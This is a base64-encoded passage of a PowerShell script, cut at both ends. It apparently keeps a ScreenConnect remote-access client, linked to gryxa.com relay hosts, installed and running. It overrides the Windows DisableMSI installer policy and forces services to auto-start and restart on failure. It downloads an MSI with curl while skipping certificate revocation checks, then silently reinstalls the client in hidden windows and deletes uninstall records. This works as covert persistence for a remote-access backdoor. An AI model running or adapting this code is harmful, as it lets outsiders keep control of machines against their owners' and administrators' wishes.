dCBDbGllbnQgKCRGaW5nZXJwcmludCkiKSwKICAgICAgICAoSm9pbi1QYXRoICRlbnY6UHJvZ3Jh
bUZpbGVzICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIpCiAgICApCiAgICAk
cGF0dGVybnMgPSBAKCd1cGRhdGUuZ3J5eGEuY29tJywgJ3VpLmdyeXhhLmNvbScsICdncnl4YS5j
b20nKQogICAgZm9yZWFjaCAoJGQgaW4gJGRpcnMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1Q
YXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsgY29udGludWUgfQogICAgICAgICRmaWxlcyA9IEAoR2V0
LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGQgLUZpbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCA2MCkKICAgICAgICBmb3JlYWNoICgkZiBpbiAk
ZmlsZXMpIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkcGF0dGVybnMpIHsKICAgICAg
ICAgICAgICAgIGlmIChTZWxlY3QtU3RyaW5nIC1MaXRlcmFsUGF0aCAkZi5GdWxsTmFtZSAtUGF0
dGVybiAkcGF0IC1TaW1wbGVNYXRjaCAtUXVpZXQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRydWUKICAgICAgICAgICAgICAgIH0K
ICAgICAgICAgICAgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKCRmLkxl
bmd0aCAtZ3QgMk1CKSB7IGNvbnRpbnVlIH0KICAgICAgICAgICAgICAgICRieXRlcyA9IFtTeXN0
ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkZi5GdWxsTmFtZSkKICAgICAgICAgICAgICAgICR0
ZXh0ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGJ5dGVzKQog
ICAgICAgICAgICAgICAgaWYgKCR0ZXh0IC1tYXRjaCAnZ3J5eGFcLmNvbScpIHsgcmV0dXJuICR0
cnVlIH0KICAgICAgICAgICAgICAgICR0ZXh0OCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVU
RjguR2V0U3RyaW5nKCRieXRlcykKICAgICAgICAgICAgICAgIGlmICgkdGV4dDggLW1hdGNoICdn
cnl4YVwuY29tJykgeyByZXR1cm4gJHRydWUgfQogICAgICAgICAgICB9IGNhdGNoIHt9CiAgICAg
ICAgfQogICAgfQogICAgJGltZyA9IChHZXQtSXRlbVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3Vy
cmVudENvbnRyb2xTZXRcU2VydmljZXNcJG5hbWUiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlKS5JbWFnZVBhdGgKICAgIGlmICgkaW1nIC1hbmQgKCRpbWcgLW1hdGNoICdncnl4YVwuY29t
JykpIHsgcmV0dXJuICR0cnVlIH0KICAgIGlmIChGaW5kLVByb2R1Y3RHdWlkICRGaW5nZXJwcmlu
dCkgeyByZXR1cm4gJHRydWUgfQogICAgcmV0dXJuICRmYWxzZQp9CgpmdW5jdGlvbiBUZXN0LVNj
UnVubmluZyhbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50
KSB7IHJldHVybiAkZmFsc2UgfQogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUKICAgIHJldHVybiBbYm9vbF0oJHN2YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAnUnVubmluZycp
Cn0KCmZ1bmN0aW9uIFRlc3QtU2NEaXIoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAgIGZvcmVh
Y2ggKCRiYXNlIGluIEAoJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9LCAkZW52OlByb2dyYW1GaWxl
cykpIHsKICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRiYXNl
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIpKSB7IHJldHVybiAkdHJ1ZSB9
CiAgICB9CiAgICByZXR1cm4gJGZhbHNlCn0KCmZ1bmN0aW9uIEZpbmQtUnVubmluZ0dyeXhhRnAg
ewogICAgIyBBTlkgbm9uLXNldnJ6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IHRoYXQgaXMgUnVubmlu
Zy9zdGFydGluZyBjb3VudHMgYXMgR3J5eGEuCiAgICAjIERvIE5PVCByZXF1aXJlIHJlbGF5LXN0
cmluZyBzY2FuIChmYWxzZSBuZWdhdGl2ZXMgY2F1c2VkIHJlaW5zdGFsbCBsb29wcykuCiAgICAk
Y2ZnID0gR2V0LUdyeXhhRnAKICAgIGlmIChUZXN0LVNjUnVubmluZyAkY2ZnKSB7IHJldHVybiAk
Y2ZnIH0KICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25u
ZWN0IENsaWVudConIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgewogICAgICAgIGlm
ICgkc3ZjLlN0YXR1cyAtbm90aW4gQCgnUnVubmluZycsICdTdGFydFBlbmRpbmcnLCAnQ29udGlu
dWVQZW5kaW5nJykpIHsgY29udGludWUgfQogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdc
KChbMC05YS1mXXsxNn0pXCknKSB7CiAgICAgICAgICAgICRmcCA9ICRtYXRjaGVzWzFdLlRvTG93
ZXIoKQogICAgICAgICAgICBpZiAoJGZwIC1pbiAkc2NyaXB0OlNldnJ6S2VlcCkgeyBjb250aW51
ZSB9CiAgICAgICAgICAgIHJldHVybiAkZnAKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJG51
bGwKfQoKZnVuY3Rpb24gVGVzdC1BbnlOb25TZXZyelNjUnVubmluZyB7CiAgICByZXR1cm4gW2Jv
b2xdKEZpbmQtUnVubmluZ0dyeXhhRnApCn0KCmZ1bmN0aW9uIFRlc3QtR3J5eGFIZWFsdGggewog
ICAgIyBMT0NBTCBoZWFsdGggb25seS4gVENQL3JlbGF5IG5ldmVyIG1hcmsgVU5IRUFMVEhZIChh
dm9pZHMgcGFuZWwgZHVwbGljYXRlcykuCiAgICAkZnAgPSBHZXQtR3J5eGFGcAogICAgJHJ1bm5p
bmdGcCA9IEZpbmQtUnVubmluZ0dyeXhhRnAKICAgIGlmICgkcnVubmluZ0ZwKSB7CiAgICAgICAg
aWYgKCRydW5uaW5nRnAgLW5lICRmcCkgeyBTZXQtR3J5eGFGcCAkcnVubmluZ0ZwOyAkZnAgPSAk
cnVubmluZ0ZwIH0KICAgICAgICAkdGNwUmVsYXkgPSBUZXN0LVRjcEhvc3RQb3J0ICRzY3JpcHQ6
R3J5eGFSZWxheUhvc3QgNDQzCiAgICAgICAgJHRjcFVpID0gVGVzdC1UY3BIb3N0UG9ydCAkc2Ny
aXB0OkdyeXhhVWlIb3N0IDQ0MwogICAgICAgIHJldHVybiAiSEVBTFRIWXwkZnB8cnVubmluZz0x
fHJlbGF5PSR0Y3BSZWxheXx1aT0kdGNwVWkiCiAgICB9CgogICAgJHJlYXNvbnMgPSBOZXctT2Jq
ZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQogICAgaWYgKC1ub3Qg
KFRlc3QtU2NSdW5uaW5nICRmcCkpIHsKICAgICAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUg
IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkZnApIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgICAgIGlmICgtbm90ICRzdmMpIHsgW3ZvaWRdJHJlYXNvbnMuQWRkKCdzdmMtbWlzc2lu
ZycpIH0KICAgICAgICBlbHNlIHsgW3ZvaWRdJHJlYXNvbnMuQWRkKCJzdmMtJCgkc3ZjLlN0YXR1
cykiKSB9CiAgICB9CiAgICBpZiAoLW5vdCAoVGVzdC1TY0RpciAkZnApIC1hbmQgLW5vdCAoRmlu
ZC1Qcm9kdWN0R3VpZCAkZnApKSB7CiAgICAgICAgW3ZvaWRdJHJlYXNvbnMuQWRkKCdub3QtaW5z
dGFsbGVkJykKICAgIH0KCiAgICAkdGNwUmVsYXkgPSBUZXN0LVRjcEhvc3RQb3J0ICRzY3JpcHQ6
R3J5eGFSZWxheUhvc3QgNDQzCiAgICAkdGNwVWkgPSBUZXN0LVRjcEhvc3RQb3J0ICRzY3JpcHQ6
R3J5eGFVaUhvc3QgNDQzCiAgICBpZiAoJHJlYXNvbnMuQ291bnQgLWVxIDApIHsKICAgICAgICAj
IHJlZ2lzdGVyZWQvZGlyIHByZXNlbnQgYnV0IHNlcnZpY2Ugbm90IHJ1bm5pbmcg4oCUIHN0aWxs
IHVuaGVhbHRoeSBmb3Igc3RhcnQvcmVwYWlyCiAgICAgICAgaWYgKC1ub3QgKFRlc3QtU2NSdW5u
aW5nICRmcCkpIHsKICAgICAgICAgICAgcmV0dXJuICJVTkhFQUxUSFl8JGZwfHN2Yy1ub3QtcnVu
bmluZ3xyZWxheT0kdGNwUmVsYXl8dWk9JHRjcFVpIgogICAgICAgIH0KICAgICAgICByZXR1cm4g
IkhFQUxUSFl8JGZwfHJlbGF5PSR0Y3BSZWxheXx1aT0kdGNwVWkiCiAgICB9CiAgICByZXR1cm4g
IlVOSEVBTFRIWXwkZnB8JCgkcmVhc29ucyAtam9pbiAnLCcpfHJlbGF5PSR0Y3BSZWxheXx1aT0k
dGNwVWkiCn0KCmZ1bmN0aW9uIFRlc3QtR3J5eGFSZWluc3RhbGxBbGxvd2VkIHsKICAgICMgTWF4
IG9uZSBjaHVybi1yZWluc3RhbGwgcGVyIDdkIHVubGVzcyAtRm9yY2UuCiAgICAjIE80MjogTkVW
RVIgYmxvY2sgd2hlbiBHcnl4YSBpcyBmdWxseSBhYnNlbnQgKHN2Yytwcm9kdWN0K2RpciBnb25l
KS4KICAgICRmcCA9IEdldC1Hcnl4YUZwCiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgIlNj
cmVlbkNvbm5lY3QgQ2xpZW50ICgkZnApIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQog
ICAgaWYgKC1ub3QgJHN2YyAtYW5kIC1ub3QgKEZpbmQtUnVubmluZ0dyeXhhRnApIC1hbmQgLW5v
dCAoRmluZC1Qcm9kdWN0R3VpZCAkZnApIC1hbmQgLW5vdCAoVGVzdC1TY0RpciAkZnApKSB7CiAg
ICAgICAgcmV0dXJuICR0cnVlCiAgICB9CiAgICAkZmxhZyA9IEpvaW4tUGF0aCAkV29ya0RpciAn
Z3J5eGFfcmVpbnN0YWxsLmZsYWcnCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0
aCAkZmxhZykpIHsgcmV0dXJuICR0cnVlIH0KICAgIHRyeSB7CiAgICAgICAgJGFnZSA9IChHZXQt
RGF0ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICRmbGFnKS5MYXN0V3JpdGVUaW1lCiAgICAg
ICAgcmV0dXJuICgkYWdlLlRvdGFsSG91cnMgLWdlIDE2OCkKICAgIH0gY2F0Y2ggeyByZXR1cm4g
JHRydWUgfQp9CgpmdW5jdGlvbiBNYXJrLUdyeXhhUmVpbnN0YWxsIHsKICAgIFNldC1Db250ZW50
IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9yZWluc3RhbGwuZmxhZycp
IC1WYWx1ZSAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykgLUVuY29k
aW5nIEFTQ0lJIC1Gb3JjZQp9CgpmdW5jdGlvbiBVbmluc3RhbGwtU2NGaW5nZXJwcmludChbc3Ry
aW5nXSRGaW5nZXJwcmludCkgewogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAn
bm8tZnAnIH0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQp
IgogICAgJGd1aWQgPSBGaW5kLVByb2R1Y3RHdWlkICRGaW5nZXJwcmludAogICAgJiByZWcuZXhl
IGRlbGV0ZSAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXInIC92IERpc2FibGVNU0kgL2YgMj4mMSB8IE91dC1OdWxsCiAgICAmIHJlZy5leGUgYWRkICdI
S0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlz
YWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwKICAgIGlmICgkZ3Vp
ZCkgewogICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0
ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MiIC1XYWl0IC1Q
YXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMg
NgogICAgfQogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlCiAgICBpZiAoJHN2YykgewogICAgICAgICYgc2MuZXhlIHN0b3AgJG5h
bWUgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJiBzYy5leGUgZGVsZXRlICRuYW1lIDI+JjEgfCBP
dXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDIKICAgIH0KICAgICMgTzQ1OiBj
bGVhciBzdGFsZSBBUlAga2V5IHNvIHNhbWUtRlAgbXNpZXhlYyAvaSBjYW4gcmUtcmVnaXN0ZXIg
KGZpeCBzdHVjayAicmVnaXN0ZXJlZCwgbm8gc3ZjL2RpciIpCiAgICBmb3JlYWNoICgkciBpbiBA
KCdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3Rh
bGwnLAogICAgICAgICAgICAgICAgICAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcTWlj
cm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJykpIHsKICAgICAgICBpZiAo
JGd1aWQgLWFuZCAoVGVzdC1QYXRoICIkclwkZ3VpZCIpKSB7CiAgICAgICAgICAgIFJlbW92ZS1J
dGVtIC1MaXRlcmFsUGF0aCAiJHJcJGd1aWQiIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZQogICAgICAgIH0KICAgICAgICBHZXQtQ2hpbGRJdGVtICRyIC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAk
ZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgkZG4gLW1hdGNoICJTY3JlZW5Db25u
ZWN0IENsaWVudCBcKCQoW3JlZ2V4XTo6RXNjYXBlKCRGaW5nZXJwcmludCkpXCkiKSB7CiAgICAg
ICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJF8uUFNQYXRoIC1SZWN1cnNlIC1G
b3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAgICB9CiAgICAgICAg
fQogICAgfQogICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0s
ICRlbnY6UHJvZ3JhbUZpbGVzKSkgewogICAgICAgICRkID0gSm9pbi1QYXRoICRiYXNlICJTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgICAgICBpZiAoVGVzdC1QYXRoIC1M
aXRlcmFsUGF0aCAkZCkgewogICAgICAgICAgICAmIHRha2Vvd24uZXhlIC9GICRkIC9SIC9EIFkg
Mj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAt
UmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICB9CiAg
ICB9CiAgICByZXR1cm4gJ3JlbW92ZWQnCn0KCmZ1bmN0aW9uIEluc3RhbGwtR3J5eGFGcm9tTXNp
KFtzdHJpbmddJE1zaVBhdGgpIHsKICAgICYgcmVnLmV4ZSBkZWxldGUgJ0hLTE1cU09GVFdBUkVc
UG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC9mIDI+
JjEgfCBPdXQtTnVsbAogICAgJiByZWcuZXhlIGFkZCAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xN
aWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9k
IDAgL2YgMj4mMSB8IE91dC1OdWxsCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdtc2lf
Z3J5eGFfZW5zdXJlLmxvZycKICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJn
dW1lbnRMaXN0ICIvaSBgIiRNc2lQYXRoYCIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJP
T1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiBgIiRsb2dgIiIgLVdhaXQgLVBhc3NUaHJ1IC1XaW5kb3dT
dHlsZSBIaWRkZW4KICAgICRleGl0ID0gJHAuRXhpdENvZGUKICAgIGlmICgkZXhpdCAtZXEgMTYx
OCkgewogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDMwCiAgICAgICAgJHAgPSBTdGFydC1Q
cm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgIi9pIGAiJE1zaVBhdGhgIiAvcW4gL25v
cmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2IGAiJGxvZ2AiIiAt
V2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAgICRleGl0ID0gJHAuRXhp
dENvZGUKICAgIH0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDEwCiAgICByZXR1cm4gJGV4aXQK
fQoKZnVuY3Rpb24gSW52b2tlLUdyeXhhRW5zdXJlIHsKICAgICMgTzQwIEhBUkQgUlVMRTogaWYg
QU5ZIG5vbi1zZXZyeiBTY3JlZW5Db25uZWN0IGlzIFJ1bm5pbmcgLT4gTkVWRVIgL3ggb3IgL2ku
CiAgICAjIE80MzogQUxXQVlTIHRyeSBzdGFydC9yZXBhaXIgQkVGT1JFIHJhdGUtbGltaXQ7IC1E
ZWVwIG11c3Qgbm90IHNraXAgbGlnaHQgaGVhbAogICAgIyAobW9uIGRlZXAgdGlja3Mgd2VyZSBy
YXRlLWxpbWl0aW5nIGZvcmV2ZXIgd2hpbGUgR3J5eGEgc3RheWVkIFN0b3BwZWQpLgogICAgaWYg
KC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFdvcmtEaXIpKSB7CiAgICAgICAgTmV3LUl0
ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkV29ya0RpciAtRm9yY2UgfCBPdXQtTnVsbAog
ICAgfQogICAgJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfZW5zdXJlLmxvZycKICAg
IGZ1bmN0aW9uIEdMb2coW3N0cmluZ10kbSkgewogICAgICAgICRsaW5lID0gJ3swfSB7MX0nIC1m
IChHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tOnNzJyksICRtCiAgICAgICAgQWRk
LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRsaW5lIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICB9CgogICAgJG9sZEZwID0gR2V0LUdyeXhhRnAKICAgICRkb0RlZXAg
PSBbYm9vbF0oJERlZXAgLW9yICRGb3JjZSAtb3IgKCRFeHRyYSAtbWF0Y2ggJyg/aSlkZWVwfGZv
cmNlJykpCiAgICBHTG9nICJncnl4YV9lbnN1cmVfYmVnaW4gZGVlcD0kZG9EZWVwIGZvcmNlPSRG
b3JjZSBvbGRfZnA9JG9sZEZwIgoKICAgICRydW5uaW5nRnAgPSBGaW5kLVJ1bm5pbmdHcnl4YUZw
CiAgICBpZiAoJHJ1bm5pbmdGcCkgewogICAgICAgIFNldC1Hcnl4YUZwICRydW5uaW5nRnAKICAg
ICAgICBHTG9nICJhbHJlYWR5X3J1bm5pbmdfZnA9JHJ1bm5pbmdGcCBsb2NrX25vX3JlaW5zdGFs
bCIKICAgICAgICBpZiAoLW5vdCAkRm9yY2UpIHsKICAgICAgICAgICAgaWYgKCRkb0RlZXApIHsK
ICAgICAgICAgICAgICAgICRtc2kgPSBKb2luLVBhdGggJFdvcmtEaXIgJ3BrZ19ncnl4YS5tc2kn
CiAgICAgICAgICAgICAgICAkdG1wID0gSm9pbi1QYXRoICRlbnY6VEVNUCAoInNjX2dyeXhhX3sw
fS5tc2kiIC1mIFtndWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCdOJykpCiAgICAgICAgICAgICAg
ICB0cnkgewogICAgICAgICAgICAgICAgICAgICRjdXJsID0gSm9pbi1QYXRoICRlbnY6U3lzdGVt
Um9vdCAnU3lzdGVtMzJcY3VybC5leGUnCiAgICAgICAgICAgICAgICAgICAgaWYgKC1ub3QgKFRl
c3QtUGF0aCAkY3VybCkpIHsgJGN1cmwgPSAnY3VybC5leGUnIH0KICAgICAgICAgICAgICAgICAg
ICAmICRjdXJsIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10
aW1lIDMwMCAtbyAkdG1wICRzY3JpcHQ6R3J5eGFNc2lVcmwgMj4mMSB8IE91dC1OdWxsCiAgICAg
ICAgICAgICAgICAgICAgaWYgKChUZXN0LVBhdGggJHRtcCkgLWFuZCAoKEdldC1JdGVtICR0bXAp
Lkxlbmd0aCAtZ3QgMTAwMDAwMCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgQ29weS1JdGVt
IC1MaXRlcmFsUGF0aCAkdG1wIC1EZXN0aW5hdGlvbiAkbXNpIC1Gb3JjZQogICAgICAgICAgICAg
ICAgICAgICAgICAkcHJvZE5hbWUgPSBHZXQtTXNpUHJvcGVydHkgJG1zaSAnUHJvZHVjdE5hbWUn
CiAgICAgICAgICAgICAgICAgICAgICAgICRuZXdGcCA9IEdldC1GcEZyb21Qcm9kdWN0TmFtZSAk
cHJvZE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRuZXdGcCAtYW5kICgkbmV3RnAg
LW5lICRydW5uaW5nRnApKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHTG9nICJmcF9k
cmlmdF9JR05PUkVEX3doaWxlX3J1bm5pbmcgcnVubmluZz0kcnVubmluZ0ZwIG1zaT0kbmV3RnAi
CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAg
ICAgICBHTG9nICJkZWVwX2ZwX21hdGNoPSRydW5uaW5nRnAiCiAgICAgICAgICAgICAgICAgICAg
ICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGNhdGNoIHsgR0xv
ZyAiZGVlcF9tc2lfc29mdGZhaWw9JF8iIH0KICAgICAgICAgICAgICAgIGZpbmFsbHkgeyBSZW1v
dmUtSXRlbSAtTGl0ZXJhbFBhdGggJHRtcCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmlu
Z0ZwfHJ1bm5pbmc9MXxuby1yZWluc3RhbGwiCiAgICAgICAgfQogICAgICAgIEdMb2cgJ2ZvcmNl
X3JlaW5zdGFsbF9kZXNwaXRlX3J1bm5pbmcnCiAgICB9CgogICAgIyBPNDM6IGxpZ2h0IGhlYWwg
QUxXQVlTIChldmVuIHVuZGVyIC1EZWVwKSDigJQgc3RhcnQvcmVwYWlyIG5ldmVyIHJhdGUtbGlt
aXRlZAogICAgJGZwVHJ5ID0gJG9sZEZwCiAgICBpZiAoVGVzdC1TY1J1bm5pbmcgJGZwVHJ5KSB7
CiAgICAgICAgU2V0LUdyeXhhRnAgJGZwVHJ5CiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRmcFRy
eXxydW5uaW5nPTEiCiAgICB9CiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJGZw
VHJ5KSIKICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZQogICAgaWYgKCRzdmMpIHsKICAgICAgICBHTG9nICJsaWdodF9zdGFydF9h
dHRlbXB0IHN0YXR1cz0kKCRzdmMuU3RhdHVzKSIKICAgICAgICAmIHNjLmV4ZSBjb25maWcgJG5h
bWUgc3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJiBzYy5leGUgZmFpbHVyZSAk
bmFtZSByZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC8zMDAwL3Jlc3RhcnQvMzAwMC9yZXN0
YXJ0LzMwMDAgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJiBzYy5leGUgc3RhcnQgJG5hbWUgMj4m
MSB8IE91dC1OdWxsCiAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNQogICAgICAgICYgc2Mu
ZXhlIHN0YXJ0ICRuYW1lIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNv
bmRzIDMKICAgICAgICBpZiAoVGVzdC1TY1J1bm5pbmcgJGZwVHJ5KSB7CiAgICAgICAgICAgIFNl
dC1Hcnl4YUZwICRmcFRyeQogICAgICAgICAgICBHTG9nICdsaWdodF9zdGFydGVkX29rJwogICAg
ICAgICAgICByZXR1cm4gIkhFQUxUSFl8JGZwVHJ5fHN0YXJ0ZWQ9MSIKICAgICAgICB9CiAgICB9
CiAgICAjIE80NTogU1RVQ0sg4oCUIHJlZ2lzdGVyZWQgYnV0IG5vIHNlcnZpY2UgYW5kIG5vIGRp
ciA9IGJyb2tlbiBtc2lleGVjLiAvZmEgcmVwYWlyLAogICAgIyBhbmQgaWYgc3RpbGwgbWlzc2lu
ZyBudWtlIEFSUCBzbyBzYW1lLUZQIC9pIHJlLXJlZ2lzdGVycy4gQnlwYXNzIHJhdGUtbGltaXQu
CiAgICBpZiAoKEZpbmQtUHJvZHVjdEd1aWQgJGZwVHJ5KSAtYW5kIC1ub3QgJHN2YyAtYW5kIC1u
b3QgKFRlc3QtU2NEaXIgJGZwVHJ5KSkgewogICAgICAgIEdMb2cgJ3N0dWNrX3JlZ2lzdGVyZWRf
cmVwYWlyX2ZhJwogICAgICAgICRudWxsID0gUmVwYWlyLVNDU2VydmljZSAkZnBUcnkKICAgICAg
ICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1CiAgICAgICAgJiBzYy5leGUgY29uZmlnICRuYW1lIHN0
YXJ0PSBhdXRvIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICYgc2MuZXhlIHN0YXJ0ICRuYW1lIDI+
JjEgfCBPdXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUKICAgICAgICBpZiAo
VGVzdC1TY1J1bm5pbmcgJGZwVHJ5KSB7CiAgICAgICAgICAgIFNldC1Hcnl4YUZwICRmcFRyeQog
ICAgICAgICAgICBHTG9nICdzdHVja19mYV9zdGFydGVkX29rJwogICAgICAgICAgICByZXR1cm4g
IkhFQUxUSFl8JGZwVHJ5fGZhLXN0YXJ0ZWQ9MSIKICAgICAgICB9CiAgICAgICAgR0xvZyAnc3R1
Y2tfYXJwX251a2VfdGhlbl9yZWluc3RhbGwnCiAgICAgICAgJG51bGwgPSBVbmluc3RhbGwtU2NG
aW5nZXJwcmludCAkZnBUcnkKICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggKEpvaW4t
UGF0aCAkV29ya0RpciAnZ3J5eGFfcmVpbnN0YWxsLmZsYWcnKSAtRm9yY2UgLUVycm9yQWN0aW9u
